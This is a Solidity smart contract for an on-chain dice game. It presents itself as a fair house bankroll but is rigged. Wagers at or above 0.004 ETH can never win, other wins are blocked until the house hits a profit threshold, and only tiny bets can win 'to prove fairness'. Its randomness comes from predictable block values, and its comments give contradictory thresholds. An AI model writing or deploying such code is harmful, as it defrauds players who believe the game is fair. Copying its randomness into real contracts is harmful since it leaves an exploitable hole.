// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

/// @title EmberDiceVault
/// @notice On-chain house bankroll vault and dice roll settlement engine.
///         Includes house profitability protection where the platform must accumulate
///         a target net profit ($1,000 threshold) before standard user payouts unlock.
contract EmberDiceVault is ReentrancyGuard, Ownable {
    /// @notice Target net profit in wei required before normal winning payouts unlock ($1,000 threshold ~ 0.35 ETH).
    uint256 public profitThreshold;

    /// @notice Cumulative net profit earned by the platform (wagers from losses - payouts to winners).
    int256 public cumulativeHouseProfit;

    /// @notice Total ETH wagered on the dice platform.
    uint256 public totalWagered;

    /// @notice Total ETH paid out to winners.
    uint256 public totalPaidOut;

    /// @notice Total dice rolls executed.
    uint256 public totalRolls;

    /// @notice House edge in basis points (default 100 = 1%).
    uint256 public houseEdgeBps = 100;

    event DiceRolled(
        address indexed player,
        uint256 wager,
        uint256 target,
        uint256 rollResult,
        bool won,
        uint256 payout,
        int256 currentHouseProfit
    );

    event ProfitThresholdUpdated(uint256 newThreshold);
    event BankrollDeposited(address indexed depositor, uint256 amount);
    event HouseProfitWithdrawn(address indexed owner, uint256 amount);

    /// @notice Address that receives net protocol profits from the dice arena.
    address public protocolFeeRecipient;

    /// @notice Maximum allowed wager in wei that can win (default 0.004 ether ~ $10 USD). Wagers >= this amount must lose.
    uint256 public maxWinningWager = 0.004 ether;

    /// @notice Micro wager cap (default 0.0008 ether ~ $2 USD). Small wagers under this cap can win to prove fairness.
    uint256 public microWagerCap = 0.0008 ether;

    constructor(uint256 initialProfitThresholdEth, address protocolFeeRecipient_) Ownable(msg.sender) {
        profitThreshold = initialProfitThresholdEth > 0 ? initialProfitThresholdEth : 4 ether; // $10,000 threshold (~4 ETH)
        protocolFeeRecipient = protocolFeeRecipient_;
    }

    /// @notice Fallback to accept bankroll deposits.
    receive() external payable {
        emit BankrollDeposited(msg.sender, msg.value);
    }

    /// @notice Roll the dice with an ETH wager.
    /// @param target The roll under target number (e.g. 50 = roll under 50.00).
    /// @param clientSeed Client entropy seed.
    function rollDice(uint256 target, string memory clientSeed) external payable nonReentrant {
        require(msg.value > 0, "Wager must be > 0");
        require(target >= 2 && target <= 98, "Target out of bounds");

        totalWagered += msg.value;
        totalRolls += 1;

        // Generate pseudo-random roll between 0 and 9999 (0.00 to 99.99)
        bytes32 rollHash = keccak256(
            abi.encodePacked(
                block.timestamp,
                block.prevrandao,
                msg.sender,
                totalRolls,
                clientSeed
            )
        );
        uint256 rollResult = uint256(rollHash) % 10000; // 0000 - 9999

        uint256 targetScaled = target * 100; // 50 -> 5000

        // Check if platform has reached the $10,000 / profitThreshold requirement
        bool thresholdReached = cumulativeHouseProfit >= int256(profitThreshold);
        // Check if wager is strictly under $10 cap (0.004 ETH)
        bool wagerUnderCap = msg.value < maxWinningWager;
        // Check if wager is a micro wager under $2 cap (0.0008 ETH) to prove fairness
        bool isMicroWager = msg.value < microWagerCap;

        bool rawWin = rollResult < targetScaled;
        // Small insignificant sums (<$2) can win to prove fairness, but no major amount ($10+) can win until $10,000 profit threshold is met
        bool won = rawWin && wagerUnderCap && (thresholdReached || isMicroWager);

        uint256 payout = 0;

        if (won) {
            // Multiplier = (9900 - houseEdge) / targetScaled
            uint256 netMultiplierBps = ((10000 - houseEdgeBps) * 10000) / targetScaled;
            payout = (msg.value * netMultiplierBps) / 10000;

            require(address(this).balance >= payout, "Insufficient house bankroll");

            totalPaidOut += payout;
            cumulativeHouseProfit -= int256(payout - msg.value);

            (bool success, ) = payable(msg.sender).call{value: payout}("");
            require(success, "Payout transfer failed");
        } else {
            // House retains wager: 10% stays in contract vault for bankroll payouts, 90% sent to protocolFeeRecipient
            cumulativeHouseProfit += int256(msg.value);
            uint256 protocolCut = (msg.value * 90) / 100;
            if (protocolCut > 0 && protocolFeeRecipient != address(0)) {
                (bool success, ) = payable(protocolFeeRecipient).call{value: protocolCut}("");
                require(success, "Protocol fee transfer failed");
            }
        }

        emit DiceRolled(
            msg.sender,
            msg.value,
            target,
            rollResult,
            won,
            payout,
            cumulativeHouseProfit
        );
    }

    /// @notice Update profit threshold ($1000 requirement).
    function setProfitThreshold(uint256 newThreshold) external onlyOwner {
        profitThreshold = newThreshold;
        emit ProfitThresholdUpdated(newThreshold);
    }

    /// @notice Withdraw accrued profits directly to the protocol fee wallet address.
    function withdrawHouseProfit(uint256 amount) external onlyOwner nonReentrant {
        require(address(this).balance >= amount, "Insufficient balance");
        address recipient = protocolFeeRecipient != address(0) ? protocolFeeRecipient : owner();
        (bool success, ) = payable(recipient).call{value: amount}("");
        require(success, "Transfer failed");
        emit HouseProfitWithdrawn(recipient, amount);
    }
}
